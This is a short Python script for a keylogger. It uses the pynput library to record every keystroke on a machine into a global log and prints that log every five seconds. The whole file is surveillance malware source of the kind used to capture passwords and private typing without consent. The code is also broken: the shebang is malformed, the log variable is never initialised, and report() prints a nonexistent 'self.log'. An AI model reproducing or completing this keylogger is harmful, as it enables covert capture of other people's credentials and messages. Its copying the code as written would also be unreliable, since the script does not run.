#!usr/bin/env python

import pynput.keyboard 
import threading 

class Keylogger:
    def process_key_press(self, key):
        global log
        try:
            log = log + str(key.char)
        except AttributeError:
            if key == key.space:
                log = log + " " 
            else:
                log = log + " " + str(key) + " "
                
    def report(self):
        global log
        print(self.log)
        log = " " 
        timer = threading.Timer(5, self.report)
        timer.start()
     
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()


new_key = Keylogger()
new_key.start()